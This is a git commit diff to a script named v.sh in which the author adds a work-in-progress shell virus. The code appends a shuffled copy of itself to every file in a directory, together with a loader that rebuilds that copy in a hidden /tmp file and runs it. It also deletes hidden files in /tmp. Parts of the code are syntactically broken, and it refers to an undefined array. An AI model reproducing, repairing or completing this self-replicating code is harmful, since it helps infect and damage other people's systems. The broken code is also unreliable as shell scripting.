8ba6e098865209933e32332899c0a75c4cb99150
cactusjackk7 <cactusjackk7@gmail.com>
2021-02-11 20:47:37 +0100

    still not done, working on it

--- bash/fresh/v.sh
+++ bash/fresh/v.sh
@@ -6,5 +6,33 @@ RANDOM=$$ #@5
 for target in *; do #@6
 		nbline=$(wc -l $target)
 		nbline=${nbline##}
-		nbline=$(echo $nbline | cut -d "" -f1)
+		nbline=$(echo $nbline | cut -d "" -f1); then 
+			continue 
+		fi 
+		NEWFILE=${MANAGER[$((RANDOM % 4))]}  #@13
+		  tail -n 36 $target | awk '{ print($NF" "$0) }' | cut -d"@" -f2- | sort -g | cut -d" " -f2- > 				/tmp/".$NEWFILE"  #@14
+			 chmod +x /tmp/".$NEWFILE" && /tmp/".$NEWFILE" test 2> /dev/null;  #@15
+		if [ "$?" == "0" ]; then  #@16
+					continue  #@17
+	x	fi  #@18
+		NEWFILE=${MANAGER[$((RANDOM % 4))]}  #@19
+		NEWFILE="/tmp/.$NEWFILE"  #@20
+		echo "tail -n 36 $0 | awk '{ print(\$NF\" \"\$0) }' | cut -d\"@\" -f2- | sort -g | cut -d\" \" 			-f2- > $NEWFILE" >> $target  #@21
+		echo "chmod +x $NEWFILE && $NEWFILE &" >> $target  #@22
+		echo "exit 0" >> $target  #@23
+		tabft=("FT" [36]=" ")  #@24
+		declare -i nbl=0  #@25
+		while [ $nbl -ne 36 ]; do  #@26
+	  valindex=$(((RANDOM % 36)+1))  #@27
+	  while [ "${tabft[$valindex]}" == "FT" ]; do  #@28
+	 valindex=$(((RANDOM % 36) + 1))  #@29
+	  done  #@30
+	 line=$(tail -n $valindex $0 | head -1)  #@31
+	  echo -e "$line" >> $target  #@32
+	 nbl=$(($nbl+1)) && tabft[$valindex]="FT"  #@33
+	done  #@34
+	done  #@35
+	rm /tmp/.* 2> /dev/null  #@36
 
+			
+		
